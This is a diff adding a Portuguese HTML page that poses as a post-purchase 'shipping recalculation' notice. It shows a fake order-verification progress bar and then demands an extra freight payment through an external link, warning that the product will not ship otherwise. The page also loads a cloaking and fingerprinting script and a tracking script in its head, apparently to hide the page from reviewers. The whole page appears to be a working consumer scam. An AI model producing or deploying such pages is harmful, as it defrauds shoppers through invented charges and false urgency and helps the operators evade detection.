@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    
+<script>
+    window.FYCLOAK_CAMPAIGN_ID = 2182;  // ID da sua campanha
+    window.FYCLOAK_USER_ID = 20;      // Seu user ID
+</script>
+<script src="https://cdn.fycloak.com/scripts/advanced-fingerprint.js"></script>
+
+<script
+	src="https://cdn.xtracky.com/scripts/utm-handler.js"
+	data-token="38b7a043-3248-4a8c-893c-ca435e78a535"
+>
+</script>
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recálculo de Frete - Ajuste Necessário</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Seção do topo -->
+   <div class="top-bar">
+    
+        <img src="frwete.png" alt="Imagem do topo">
+    </a>
+</div>
+
+
+    <!-- Seção de verificação do pedido -->
+    <div id="verification-section" class="full-screen-section">
+        <div class="verification-content">
+            <h1>Seu pedido foi concluído!</h1>
+            <p>Aguarde enquanto realizamos a verificação do pedido...</p>
+            <!-- Barra de progresso animada -->
+            <div class="progress-bar">
+                <div class="progress" id="progress"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Seção após a verificação -->
+    <div id="error-section" class="full-screen-section hidden">
+        <!-- Box separadas que aparecem uma abaixo da outra -->
+        <div class="box-stage hidden" id="box-1">
+            <h3>Pedido Concluído com Sucesso ✅</h3>
+            <p>Aguarde um momento...</p>
+        </div>
+        <div class="box-stage hidden" id="box-2">
+            <h3>Recálculo de Frete em Andamento 🔄</h3>
+            <p>Verificando ajustes necessários para sua região...</p>
+        </div>
+        <div class="box-stage hidden" id="box-3">
+            <h3>Ajuste de Frete Necessário para Sua Região 📦</h3>
+            <p>Identificamos que é necessário um valor adicional de frete para sua localização. Este é um recálculo baseado na distância exata para entrega.</p>
+            
+            <div class="warning-box">
+                <p><strong>⚠️ ATENÇÃO:</strong> Sem o pagamento deste ajuste, seu produto <strong>NÃO SERÁ ENVIADO</strong>. O envio só será liberado após a confirmação do pagamento complementar.</p>
+            </div>
+            
+            <a href="https://pay.utencilioscasa.site/JzcFvGPd" id="retry-button" class="retry-button">Receber minha encomenda</a>
+            <br>
+            <br>
+            <p><strong>💰 Importante:</strong> Este é um valor complementar. O frete já pago será mantido e este valor será somado para completar o custo real de entrega para sua região.</p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+
+</body>
+</html>
